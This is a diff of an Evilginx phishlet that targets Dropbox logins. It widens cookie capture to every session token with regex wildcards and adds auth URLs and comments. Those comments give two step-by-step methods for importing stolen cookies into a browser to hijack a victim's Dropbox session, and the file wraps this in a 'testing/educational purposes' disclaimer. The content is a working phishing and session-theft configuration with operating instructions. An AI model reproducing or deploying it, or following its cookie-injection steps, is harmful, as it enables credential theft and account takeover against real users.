@@ -1,3 +1,6 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.  
+
 author: '@an0nud4y'
 min_ver: '2.3.0'
 
@@ -15,18 +18,47 @@ sub_filters:
   - {triggers_on: 'www.dropbox.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
 auth_tokens:
+  - domain: 'dropbox.com'
+    keys: ['.*,regexp']
   - domain: '.dropbox.com'
-    keys: ['GfUZ','locale','blid','t','bjar','db-help-center-uid','last_active_role','.*,regexp']
+    keys: ['.*,regexp']
   - domain: 'www.dropbox.com'
-    keys: ['gvc','__Host-ss','__Host-js_csrf','.*,regexp']    
+    keys: ['.*,regexp']    
   - domain: '.www.dropbox.com'
-    keys: ['lid','jar','.*,regexp']
-    
+    keys: ['.*,regexp']
+auth_urls:
+  - '/h'
+  - '/h/.*'   
+  
+# METHODS TO IMPORT COOKIES AND GETTING SESSION  
+  
+#METHOD - 1
+
+# Open Chrome/Firefox browser goto Developer tools > Application/Storage > Cookies
+# Now Open www.dropbox.com in tab.
+# Install Cookie Editor(https://cookie-editor.cgagnier.ca/)
+# From Developer Tools Remove All Cookies From all domains (whatever domains storing cookies during visiting www.dropbox.com)
+# Get All Captured Cookies From Evilginx and Import them From Cookie-Editor.
+# Now Check For cookie name "__Host-js_csrf" and check its value from the developer tools and compare with the value of cookies in evilginx.
+# If Values are not same , repeat above process again.
+# If Values are Same then visit to this address in same tab. www.dropbox.com/h
+
+# You Should have Got session, If Not Repeat All Process Again or Follow Method-2(Below)
+
+  
+#METHOD - 2  
+
+# MODIFY COOKIES FORMAT--
+# 1) Copy All Cookies from Evilginx Panel.
+# 2) Check For Expiration Date And Replace to "Expires raw", Like -->  "expirationDate":1649315104   to  "Expires raw": "1649315104", in cookies(original).
+# 3) Similarly Change the Value of All respectictive cookies.
+# 4) Then Use this firefox extension to inject these cookies manually. (https://github.com/ysard/cookie-quick-manager/)
+
 #INJECT THESE COOKIES --
 # 1) OPEN BROWSER WITH HOMEPAGE
-# 2) INJECT ALL CAPTURED COOKIES
+# 2) INJECT ALL CAPTURED COOKIES USING THIS EXTENSION
 # 3) GOTO ADDRESS : https://www.dropbox.com/h  
-# 4) YOU SHOULD HAVE GOT SESSION, IF NOT REPEAT PROCESS WITH OTHER INJECTION METHOD FORR COOKIES
+# 4) YOU SHOULD HAVE GOT SESSION, IF NOT REPEAT PROCESS WITH OTHER INJECTION METHOD(try using console) FOR COOKIES
 
 
 credentials:
@@ -69,3 +101,7 @@ js_inject:
         return;
       }
       setTimeout(function(){ onclickListener(); }, 1000);
+
+
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.  
